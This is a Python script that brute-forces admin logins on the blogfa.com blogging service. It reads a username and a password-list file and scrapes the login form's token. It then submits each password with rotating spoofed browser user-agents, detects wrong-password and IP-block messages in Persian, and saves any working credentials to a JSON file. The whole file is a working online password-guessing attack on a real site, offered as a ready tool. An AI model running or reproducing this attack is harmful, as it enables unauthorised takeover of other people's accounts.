#!/usr/bin/python3

import os
import requests as rq
from bs4 import BeautifulSoup
import rich
import random
import time
import json
import sys

os.system("")

commands: dict = {}

def getPublicIP() -> dict:
    db = {}
    try:
        ip = rq.get("https://api.ipify.org").text
        return {"error" : False, "ip" : ip}
    except Exception as ERR:
        return {"error" : True, "base" : ERR}

class colors:
    red = '\033[91m'
    green = '\033[92m'
    blue = '\033[94m'
    yellow = '\033[93m'
    magenta = '\033[95m'
    cyan = '\033[96m'
    white = '\033[97m'
    bold = '\033[1m'
    underline = '\033[4m'
    black='\033[30m'
    Backsilver='\033[100m'
    silver='\033[90m'
    Backwhite='\033[3m'
    Backgreen='\033[42m'
    Backyellow='\033[43m'
    BackBlue='\033[44m'
    Backpink='\033[45m'
    Backcyan='\033[46m'
    BackRed='\033[41m'
    green = '\033[32m'
    red = '\033[31m'
    blue = '\033[36m'
    pink = '\033[35m'
    yellow = '\033[93m'
    darkblue = '\033[34m'
    white = '\033[00m'
    bluo = '\033[34m'
    red_p = '\033[41m'
    green_p = '\033[42m'
    bluo_p = '\033[44m'
    pink_p = '\033[45m'
    blue_p = '\033[46m'
    white_p = '\033[47m'
    rd = '\033[91m'
    black='\033[30m'
    bold = '\033[1m'
    underline = '\033[4m'
    magenta = '\033[95m'


class BufferList(object):
    def __init__(self,
                 List: list = [],
                 ):
        
        self.list = List
        
    def parse(self):
        bfd = {}

        for i in range(len(self.list)):
            bfd["_"+str(i+1)] = self.list[i]

        return bfd
    
    def isexists(self, target):
        if target in self.list:
            return True
        else:return False
    
    def indexexists(self, target):
        if target in self.list:
            return self.list.index(target)
        else:return False

    def isinfrontof(self, target, indexes):
        isit = False

        if target in self.list:
            try:
                indx = self.list.index(target)
                if indx == indexes:
                    isit = True
                else:isit = False
            except Exception as e:return e
        
        return isit

class BufferConsole(object):
    def __init__(self):

        self.data = []

    def __setcommands__(self, __key, __value):
        commands[__key] = __value
        return commands
    
    def getDictArgv(self):
        return BufferList(sys.argv).parse()
    
    def addFlag(self, *flags, mode: str = "in_front_of"):
        flg = list(flags)
        for i in range(len(flg)):
            self.__setcommands__(str(i+1), flg[i])

        if mode == "in_front_of":
            for key, val in BufferConsole().getDictArgv().items():
                if str(val) in flg:
                    keyx = int(str(key).replace("_", ""))
                    keyx += 1
                    if not f"_{keyx}" in BufferConsole().getDictArgv().keys():
                        self.data.append("Null")
                        pass
                    else:
                        self.data.append(BufferConsole().getDictArgv()[f"_{keyx}"])
                        pass
                
                else:
                    pass

            return self.data


username = BufferConsole().addFlag("--username")
passwlist = BufferConsole().addFlag("--password-list")

if len(username) == 1:
    if username[0] == "Null":
        print(f"{colors.red}ERROR:{colors.white} cannot get the username")
    else:
        if len(passwlist) == 1:
            if passwlist[0] == "Null":
                print(f"{colors.red}ERROR:{colors.white} cannot get the password list path")
            else:
                if not os.path.exists(passwlist[0]):
                    print(f"{colors.red}ERROR:{colors.white} The Path {colors.yellow}'{passwlist[0]}'{colors.white} Does not Exists")
                else:
                    myip = False
                    pip = getPublicIP()
                    
                    if pip['error'] == True:
                        print(f"{colors.red}Error To Get IP: {colors.white}{pip['base']}")
                    else:
                        myip = pip['ip']
                    
                    agnt = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36','Mozilla/5.0 (X11; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0','Mozilla/5.0 (X11; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36']
                    agent = (random.choice(agnt))

                    __HEDBLOG__ = {'Host': 'blogfa.com',
                    'User-Agent': agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': '175',
                    'Origin': 'https://blogfa.com',
                    'Connection': 'keep-alive',
                    'Referer': 'https://blogfa.com/desktop/login.aspx?r=637860193478105692',
                    'Upgrade-Insecure-Requests': '1',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache'
                    }


                    pas = open(passwlist[0], 'r').read().split()
                    url = rq.get('https://blogfa.com/desktop/login.aspx')

                    infoClient = (url).text
                    clientData = BeautifulSoup(infoClient, 'html.parser')

                    t_t = clientData.find('input')['value']


                    for password_ in pas:
                        
                        payload = {"_tt":t_t,
                    "usrid":username[0],
                    "ups":password_,
                    "btnSubmit":"ورود+به+بخش+مدیریت+وبلاگ"}

                        respone = rq.post('https://blogfa.com/desktop/login.aspx', data=payload, headers=__HEDBLOG__)
                        responeData = (respone).text

                        blog = BeautifulSoup(responeData, 'html.parser')
                        _dta_ = blog.find_all('i')
                        _data_ = str(_dta_)

                        ___CHECK_AUTHENTICATION___ = ("کلمه عبور را اشتباه وارد کرده اید")


                        if ___CHECK_AUTHENTICATION___ in _data_:
                            
                            rich.print(f"\"{password_}\" => False")
                        if 'در حال حاضر به دلیل حفظ امنیت کاربران امکان ورود به بخش مدیریت را ندارید' in _data_:
                            if myip == False:
                                rich.print(f"{colors.white}Your \"IP\" was seted in block list of site")
                            else:
                                rich.print(f"{colors.white}Your IP \"{myip}\" was seted in block list of site")
                            exit(0)


                        if ___CHECK_AUTHENTICATION___ not in _data_:
                            rich.print(f'\"{password_}\" => True')
                            file = open("200_password.json", "a")
                            file.write(json.dumps({
                                "username" : username,
                                "password" : password_,
                                "saved_path" : os.getcwd(),
                                "finish_time" : time.ctime(time.time())
                            }, indent=4)+"\n")
                            exit(0)

        else:
            print(f"{colors.red}ERROR:{colors.white} --password-list flag does not called or called more than once")

